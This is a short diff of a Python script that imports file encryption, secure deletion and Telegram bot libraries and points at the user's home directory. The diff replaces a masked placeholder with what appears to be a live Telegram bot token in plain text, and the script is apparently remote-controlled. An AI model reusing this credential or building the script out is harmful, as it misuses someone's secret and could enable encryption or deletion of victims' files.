@@ -12,7 +12,7 @@ import pyAesCrypt
 import xml.etree.ElementTree as ET
 from secure_delete import secure_delete
 
-TOKEN = '*************:**************-**************_**-*'  
+TOKEN = '6568398856:AAHjrmg4wRnB_StWDwBSKRZZdybwsM3-teA'  
 
 bot = telebot.TeleBot(TOKEN)
 cd = os.path.expanduser("~")
